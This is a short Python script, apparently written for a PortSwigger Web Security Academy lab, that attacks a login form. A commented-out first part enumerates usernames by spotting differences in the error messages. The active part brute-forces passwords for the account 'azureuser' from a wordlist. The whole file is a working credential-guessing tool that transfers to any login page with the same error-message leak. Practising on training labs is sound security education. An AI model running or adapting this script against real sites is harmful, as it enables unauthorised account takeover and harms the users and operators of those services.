import requests
import sys

url = "https://aca11f111f263ef0c0a14421001a007d.web-security-academy.net/login"

cookies = {'session':'luwTcBHfXCqLkL53PH1rc9ATmfwSdkiK'}
post_data = ""

user = ""
password = ""

'''
#username will be found
hit = "Invalid username"
with open('usernames.txt') as f:
	for users in f:
		user = users.strip()
		post_data = {'username':f'{user}','password':'pass'}
		r = requests.post(url, data = post_data, cookies=cookies)

		if hit not in r.text:
			print(f"[+]Username Found: {user}")
			break
'''

#use the username below

hit = "Incorrect password"
with open('passwords.txt') as f:
	for passwords in f:
		password = passwords.strip()
		post_data = {'username':'azureuser','password':f'{password}'}
		r = requests.post(url, data = post_data, cookies=cookies)

		if hit not in r.text:
			print(f"[+]Password is: {password}")
			break
